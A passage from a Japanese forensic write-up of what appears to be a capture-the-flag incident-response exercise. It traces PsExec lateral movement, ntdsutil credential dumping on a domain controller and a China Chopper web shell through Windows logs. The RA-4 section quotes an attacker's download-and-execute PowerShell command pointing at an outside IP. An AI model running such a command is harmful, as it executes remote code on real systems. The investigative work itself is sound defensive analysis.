攻撃者は、はじめ、「`YUPdate`」でディフェンダーの設定変更を試みるも、失敗し、当該タスクの登録を更新して、再度実行させて

### ◇ M-5
![image](https://github.com/user-attachments/assets/b99aa8fc-d554-4c98-bf67-1f7c17fbb18e)
* YUPdateは`2021-04 03:49:01`に実行されていた

# 15 DD-3
## (1) 問題
![image](https://github.com/user-attachments/assets/eb79ed26-e0a6-4b0d-9de1-cdf83b1151f1)

## (2) 方針
* corp-devのログイン履歴を調べるためにcorp-devのセキュアイベントログを確認する
* 新しいドメインユーザにログインしていた場合、プロファイルが作成される可能性が高いのでcorp-devのMFTを見る
* ドメイン認証を用いているのでDCに対するログインの処理が記録されていると思われるのでこれを調べる
  
## (3) 実行
### ◇ MFTファイルで新たにプロファイルがないか確認する
![image](https://github.com/user-attachments/assets/93ac6559-2930-4beb-9331-4c4af90a6029)
#### ① PSEXESVC.exeの作成
![image](https://github.com/user-attachments/assets/020b500a-5524-4e37-8682-c7c0044938de)
* `2021-04-01 04:43:18`に不審なファイル`PSEXESVC.exe`が実行されていた。
* このファイルは、sysinternalsのPSexecという、リモートコマンド実行するツールが、**接続先マシンに作成するサービスのファイル**
* なので、`Psexec`を用いてcorp-webdevこの後、リモートコマンドを実行したと考えられる

#### ② 新たなユーザの作成？
![image](https://github.com/user-attachments/assets/23287187-86d9-49b9-be1f-d3d9ff5c9b76)
* 2021-04-01 04:54:25　Goroup Policy\Usersの配下に新たなSIDの登録があった
* `S-1-5-21-3316040739-64797688-1164660000-1116`が作成されていた

#### ③ dadminの使用？
![image](https://github.com/user-attachments/assets/15713f69-b588-4a8f-b1d3-54861144cc38)
* `2021-04-01 04:54:26` 以降からdadminは以下に多くのファイルが作成されるようになった。

#### ④ ADに関連するタスク？
![image](https://github.com/user-attachments/assets/71f784bc-d64a-4c55-a8fc-fdebe1325cc1)
* 2021-04-01 05:54:02 .\Windows\System32\Tasks\ActiveDirectoryServiceが作成されていた
* Tasksは以下なのでタスクスケジューラで置かれたと思われる

##### \Windows\System32\Tasks\ActiveDirectoryServiceを見る
![image](https://github.com/user-attachments/assets/fe5d63c9-75b6-46c3-8f23-744be6909427)
* `IIS APPPOOL\alienによってスケジュールされたタスクだった。
* すぐ実行されるものだった。
![image](https://github.com/user-attachments/assets/779be7f4-959d-4426-a44d-aa36943b747e)
* ntdsutilを用いて、クレデンシャルダンプするコマンドを実行するものだった。
* dev_agardnerで実行されるようになっていた。

#### 考察(推測)
* psexecを用いて、攻撃者は、dadminを作成？したのち、これを操作していた。
* 2021-04-01 05:54:02 にdev_agardnerのアカウントの権限で動くタスクを`IISS APPPOOL\alien`で作成＊* 
*  このタスクを用いて`ntdsutil`を実行し、このマシンにあるクレデンシャルをダンプした。(推測部分)

### ◇ Securityイベントを確認する
#### ① dev_agardnerに対する接続
![image](https://github.com/user-attachments/assets/a8a7c67a-d300-45b8-937f-1137efda5aaa)
* `2021/04/01 4:09:56`にdev_agardnerに対する接続があった
* しかしながら、定期的にこのアカウントに対するネットワークログオンがあったので攻撃者が実行したかは不明

#### ② jadminに対する接続試行からの多数のログイン試行
![image](https://github.com/user-attachments/assets/6399fa18-6425-4296-91ff-784255681bca)
* 2021/04/01 3:54:51以降から10.2.0.196からのログイン試行があった。
* 多数のログイン試行であり、このユーザでは、成功監査が見当たらなかったが、dadminユーザにはログインできていたのでパスワードクラック(パスワードリスト攻撃？)には成功したと考えられる
* 失敗のイベントは、`4625`

##### ② dadminに対する接続試行
![image](https://github.com/user-attachments/assets/19ff7bad-1d4e-40b3-90f7-2f19ae875dc8)
* 2021/04/01 03:54:01 10.2.0.196が、dadminへのネットワークログオンに成功していた
###### SID発見
![image](https://github.com/user-attachments/assets/8ded0e31-fb03-4e25-af92-1623cb897df1)
*  S-1-5-21-3316040739-64797688-1164660000-1116 がdadminのSIDだとわかった。

##### ④ dev_agardnerに対する接続(続)
![image](https://github.com/user-attachments/assets/86c01f1a-b265-4416-a148-b03dde1cb1ae)
* 2021/04/01 4:09:56 に10.1.0.80からdev_agardnerに対する接続があった。

##### ⑤ NtLmSspに対する多数のログイン？試行
![image](https://github.com/user-attachments/assets/9d4640cb-97d1-478b-8c73-31c6883f080b)
* 2021/04/01 04:26:10 から`10.2.0.196`への NtLmSspのプロセスに対する接続がめちゃくちゃ多くなっていた。
* SIDには、` S-1-5-21-3316040739-64797688-1164660000-1112 `が利用されていた

![image](https://github.com/user-attachments/assets/ce1ba217-3ee3-4c8e-9615-154403d66060)
* 2021/04/01 04:27:07 まで頻繁で連続的なアクセスがあった

### ◇ DCのセキュリティイベントの確認
![image](https://github.com/user-attachments/assets/89e3b260-4775-4567-bc24-17328f80e820)
* 2021/04/01 05:29:42にIP`10.1.1.110`(corp-webdev)からdev_agardnerのネットワークログインがあった。

![image](https://github.com/user-attachments/assets/0ed3e6ba-af97-4c91-b912-510ba764e310)
* その後、2021/04/01 05:57:44からDCへの`dev_agardnerユーザでのPSEXECSVC.exeからの対話型ログオンがあった
* psexecによって、攻撃者がアクセスしたと考えられる。

### ◇ DCのMFTを確認
#### ① dev_agardnerユーザのプロファイル作成
![image](https://github.com/user-attachments/assets/f1274f42-e491-4487-9ec0-35a8fbc050fd)
* 2021-04-01 05:57:44 dev_agardnerのユーザのプロファイルが作成されていた

#### ② 資格情報等の収集の痕跡
![image](https://github.com/user-attachments/assets/6e04ec34-15a2-4712-9914-82bc7f2adb82)
* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
* 2021-04-01 06:01:30 ad.zipファイルの作成

### ◇ まとめ (推測)
攻撃者は、db_alien、dadmin等を調べたのち、(dev_agardnerの資格情報を取得し、: 推測)dev_agardnerの権限でDCにアクセスできることが分かり、DCへ`2021/04/01 05:57:44`にpsexecを用いてアクセスした。

### ◇ powershellのスクリプト実行(関係ない見つかったやつ)
![image](https://github.com/user-attachments/assets/210473a6-4e85-4798-86ca-de36886b590d)
* 2021/04/01 4:55:03以降、リモートコマンドが実行されていた
* コマンドは、スクリプトであった。
## (4) 参考資料
psexesvcについて
* https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec
* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/PsExec.htm

# 15 DD-4
## (1) 問題
![image](https://github.com/user-attachments/assets/cb54323c-1bc9-461d-a476-d37a49c5f61e)
## (2) 方針
* DCのセキュリティログからログイン失敗ログをみる
* ほかのマシンのマシンのセキュリティログを見る
## (3) 実行
### ◇ corp-filesマシンのセキュリティログを見る
今まで見たIP,ユーザ名で探す
#### ① dev_agardnerによるログイン成功ログ
![image](https://github.com/user-attachments/assets/da37c358-188b-4eab-8f7a-dd7a42aca249)
* `2021/04/01 05:44:26`  10.1.1.110(corp-wevdev)からdev_agardnerのユーザによるcorp-fileマシンへのログインができていた。

#### ② adminへのログイン失敗ログ
![image](https://github.com/user-attachments/assets/030ae5a2-b053-47e2-a4ce-434f672e3b2d)
* 2021/04/01 06:18:00 10.1.1.110(corp-wevdev)からadminユーザへのログインが失敗していた

#### ③ re_bmiltonへのログイン成功ログ
![image](https://github.com/user-attachments/assets/4f92e7d4-bea9-4d65-9d47-161fcbd6f6b0)
* 2021/04/01 06:18:53 10.1.1.110(corp-wevdev)からre_bmiltonユーザへのログインが成功していた

### ◇ ケルベロス認証を確認する
DCのセキュリティログからケルベロス認証のログ確認する(イベントID:4768,4771,4772)
![image](https://github.com/user-attachments/assets/efc3cbb2-76e9-4a1c-8732-53f10ad213b4)
* 多くのチケット要求があった

### ◇ corp-webdevのsmbのログを調べる
wakaran

### ◇ 推測
COPE-FILESマシンへのadminによるアクセスの失敗があったので多分、COPE-FILESだと思われる

## (4) 参考文献
ケルベロスチケットのログ ：https://blogs.manageengine.jp/how_to_audit_logon_1/

# 16 DD-5
## (1) 問題
![image](https://github.com/user-attachments/assets/2a96d752-2a56-419c-8b5d-b9c4ecc5ea55)
## (2) 方針
前から見えていたやつ
![image](https://github.com/user-attachments/assets/0ed3e6ba-af97-4c91-b912-510ba764e310)
* その後、2021/04/01 05:57:44からDCへの`dev_agardnerユーザでのPSEXECSVC.exeからの対話型ログオンがあった
* psexecによって、攻撃者がアクセスしたと考えられる。
## (3) 結論
psexecツール

## (4) 参考資料
psexesvcについて
* https://learn.microsoft.com/ja-jp/sysinternals/downloads/psexec
* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/PsExec.htm

# 17 DD-6
## (1) 問題
![image](https://github.com/user-attachments/assets/2ec13197-9157-486a-8642-9139c579ffd5)

## (2) 方針
以下の得た情報から考える
### ◇ DCのMFTから得た情報
![image](https://github.com/user-attachments/assets/6e04ec34-15a2-4712-9914-82bc7f2adb82)
* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
### ◇ \Windows\System32\Tasks\ActiveDirectoryService不審タスク
![image](https://github.com/user-attachments/assets/fe5d63c9-75b6-46c3-8f23-744be6909427)
* `IIS APPPOOL\alienによってスケジュールされたタスクだった。
* すぐ実行されるものだった。
![image](https://github.com/user-attachments/assets/779be7f4-959d-4426-a44d-aa36943b747e)
* ntdsutilを用いて、クレデンシャルダンプするコマンドを実行するものだった。
* dev_agardnerで実行されるようになっていた。

## (3) 結論
ntdsutilを用いてDCのクレデンシャルダンプを行った。

## (4) 参考
ntdsutilについて
* https://xtech.nikkei.com/it/article/COLUMN/20080117/291254/
* https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/details/ntdsutil.htm

# 18 DD-7
## (1) 問題
![image](https://github.com/user-attachments/assets/33ea7530-db48-475f-a790-c30b57d306a6)

## (2) 実行
すでにこの情報は、セキュリティのログインから見れた。
![image](https://github.com/user-attachments/assets/4f92e7d4-bea9-4d65-9d47-161fcbd6f6b0)
* 2021/04/01 06:18:53 10.1.1.110(corp-wevdev)からre_bmiltonユーザへのログインが成功していた
## (3) 結論
re_bmilton

# 19 DD-8
## (1) 問題
![image](https://github.com/user-attachments/assets/4697f369-762e-43d1-a8a3-dce17a2741e0)

## (2) 方針
* 偵察ツールと書かれていたので今まで、見つけたツールを列挙する
* CORP-FILESマシンのMFTのファイル作成を見る

## (3) 実行
### ◇ これまでに発見したDCの偵察ツールに関連するファイル
![image](https://github.com/user-attachments/assets/b3053385-48c3-43aa-8469-3bf8a13fc53f)
* 2021-04-01 05:57:49 ntdsutilによるDCの資格情報等の複製、搾取(ntds.dit、ntds.jfm)
* 2021-04-01 05:58:04 レジストリ情報の搾取 (SYSTEMレジストリ、SECURITYレジストリ)
* 2021-04-01 06:01:30 ad.zipファイルの作成
![image](https://github.com/user-attachments/assets/3363b53b-e34c-471c-9a90-53ca7c3c5f5f)
* 2021-04-01 06:19:19 filedir.txtの作成
### ◇ CORP-FILESマシンのMFT
ない？？？

## 
# 14 RA-1
## (1) 問題
![image](https://github.com/user-attachments/assets/c2d447c0-8fba-45eb-8632-c8f57ce86ba3)

## (2) 方針
sample2ないし、submit.aspxへのアクセスを確認する

## (3) 実行
![image](https://github.com/user-attachments/assets/7f9f2a7c-e7e5-4844-ab9a-cae2d1d48908)
* 2021-04-05 21:57:12 だった

# 14 RA-2
## (1) 問題
![image](https://github.com/user-attachments/assets/9037cdc7-375b-4dbe-ac2e-d55ee46d2c6e)
## (2) 方針
* Defenderとかに検知されたと考えdmz-webdevのDefenderのイベントログファイルを調べる
* 2021-04-05 21:57:12 の付近のログを見る


## (3) 実行
### ◇ Windows Defenderのログを確認
![image](https://github.com/user-attachments/assets/46b1f518-bc9c-4191-bc9b-dc6a3e6ae0e3)
* App_Web_aa0aecbt.dllがDefenderに検知されていた。

![image](https://github.com/user-attachments/assets/feecec06-60c9-4b7e-a945-5eef4fcdd293)
* Defenderによって、`Backdoor:MSIL/Chopper.F!dha`と検知されていた。
### ◇ 検知されたツールの一般名を調べる
![image](https://github.com/user-attachments/assets/ab159af5-d34f-4adf-bcc7-ba4d6da3dff2)
「`China Chopper`」と呼ばれるようだ

### ◇ 結論
このツールは、「`China Chopper`」

### ◇ Web shellの変更？について(推測)
![image](https://github.com/user-attachments/assets/2ae7414c-81e1-46b6-a5fd-c0a94fb940bc)
`submit.aspx`へのアクセスができなくなった以降のログを確認すると`2021-04-05 23:16:07`から`/global.aspx`にアクセスするようになった。
* つまり、別のツールを用いてDefenderを避けようとしてたのでは？

## (4)  参考文献
China Chopperについて：https://www.cisa.gov/news-events/analysis-reports/ar21-072c

# 14 RA-3
## (1) 問題
![image](https://github.com/user-attachments/assets/460132f6-366e-49a5-8e7e-a325db5a1524)

## (2) 方針
* レプリケーションするサービスである`DFSR`のイベントログを確認し、エラーがないか見てみる
* 再度WebShellを蔵置とあるので今度は、「`global.aspx`」のほうだと思われる
* corp-webdevマシンのほうに複製しているはずなのでそちらのログを確認する

## (3) 実行
### ◇ DFSRのログを確認(dmz-webdev)
うまいログが見つからなかった。エラーは、起こしていたが細かいのは、わからなかった
### ◇ corp-webdevマシンのWebのアクセスログを確認
![image](https://github.com/user-attachments/assets/795d0483-904a-4ce0-9282-29469f861d6e)
* 2021-04-05 23:16:25 にアクセスできていなかった。

### ◇ DFSRのログを確認(corp-webdev)
* 頑張る
![image](https://github.com/user-attachments/assets/028e447a-dacf-4127-b1bb-0ab1d5b94d89)
* 2021/04/01 8:38:00 イベントID5014でファイルをレプリケートしなくなっていた。

## (4) 参考文献
DFSRのイベントID:https://learn.microsoft.com/ja-jp/troubleshoot/windows-server/networking/distributed-file-system-replication-not-replicate-files

# 15 RA-4
## (1) 問題
![image](https://github.com/user-attachments/assets/30765a09-43f3-49f3-bcdf-75b069fa6cda)

## (2) 方針
* ホスト間の接続なのでalien_dbのディレクトリが作成された時間に近いと考えられる
* WinRMやnetlogonまたは、RDPが利用されている可能性があるのでセキュリティイベントログを確認する
* タスクをスケジュールすることによって作成している可能性があるのでこのログを見る
* public-webdevマシンのMFT及びコマンド、タスク実行を確認する
## (3) 実行 
### ◇ 前回見つけた情報
![image](https://github.com/user-attachments/assets/5431d26c-19ef-4094-9c17-1dd795f65119)
* 2021-04-01 03:30:34 - alien_dbのフォルダが作成されていた。
* ユーザのプロファイルがこの時作成されていたのでalien_dbを用いてRDP等でアクセスした可能性が高い

![image](https://github.com/user-attachments/assets/2ae7414c-81e1-46b6-a5fd-c0a94fb940bc)
`submit.aspx`へのアクセスができなくなった以降のログを確認すると`2021-04-05 23:16:07`から`/global.aspx`にアクセスするようになった。
![image](https://github.com/user-attachments/assets/2df5ad50-b60e-44dc-9471-53717d9e5756)
* global.aspxに2021-04-06 00:27:45アクセスできなくなり、
* 2021-04-06 00:34:05に再アップロードしていた。
### ◇ 2021-04-05 23:00:00以降のログインを確認する

### ◇ タスクスケジューラを確認する
![image](https://github.com/user-attachments/assets/92cd6b39-c333-4a35-99a1-4bd420ef6427)
* 2021/04/06 034:16 dev_agardnerによって新しいタスクが実行されていた。

![image](https://github.com/user-attachments/assets/c6620f86-ae89-4246-9936-2f80f5c34c18)
![image](https://github.com/user-attachments/assets/9517e3b9-42db-4137-b847-f11250e83a7a)
* IIS APOOL\alienによって作成され、`powershell IEX (iwr -useb http://13.54.35.87:80/404_rl)`を実行していた。
* `http://13.54.35.87:80/404_rl`にデータを要求し、IEXによって実行していた。
![image](https://github.com/user-attachments/assets/4932cf90-6b57-4e26-973a-88dd30198564)
* 同時刻に実行されていた

### IEXによって実行されたパワーシェルを確認する
![image](https://github.com/user-attachments/assets/20fa8a35-b89e-4536-9096-c4387e9c250d)
* 2021/04/06 01:02:01に先程のタスクが実行されていた

### ◇ public-webdevマシンのMFTを見る
#### ① dev_agardnerへのログイン？
![image](https://github.com/user-attachments/assets/d3ba1e00-b7c3-4ae0-a532-3c67117a27ce)
* 2021-04-04 04:25:37 pub_webdevマシン上でdev_agardnerのプロファイルが作成されていた。
#### ② 以降よくわからんのの実行
![image](https://github.com/user-attachments/assets/774ab11b-f805-4ece-8605-28e7a42051bb)
* inetにいろいろやったり、INFにいろいろやった後、Windows Defenderが動いていた。
#### ③ Administratorへのログイン？
![image](https://github.com/user-attachments/assets/be5a6972-d6f8-4201-918e-be34c8746a7d)
* pub_webdevマシン上でAdministratorのプロファイルが作成されていた。

#### ④ 新しいWebShellの作成？
![image](https://github.com/user-attachments/assets/e4f04c04-251c-4f95-8d45-0f46f677e5f4)
* 2021-04-05 23:16:07 新たに、global.aspx.cdcab7d2.compiledが作成されていた。
* global.aspxへのアクセスがウェブサービスのログにあったので、新たに作成されたWebShellだと考えられる

#### ⑤ 重要ファイルの収集？
![image](https://github.com/user-attachments/assets/5415a5d2-7579-4b44-9d3d-1b54e32cc2e6)
* 2021-04-06 00:42:13 謎のファイル`\Windows\Temp\xfiles.zip`が作成されていた。
* 名前からおそらく重要ファイルをアーカイブしたものだと考えられる

### ◇ public-webdevマシンのPowershellのイベントログを見る


## (4) 参考文献
iex(Invoke-Expression):https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4

iwr(Invoke-WebRequest):https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4
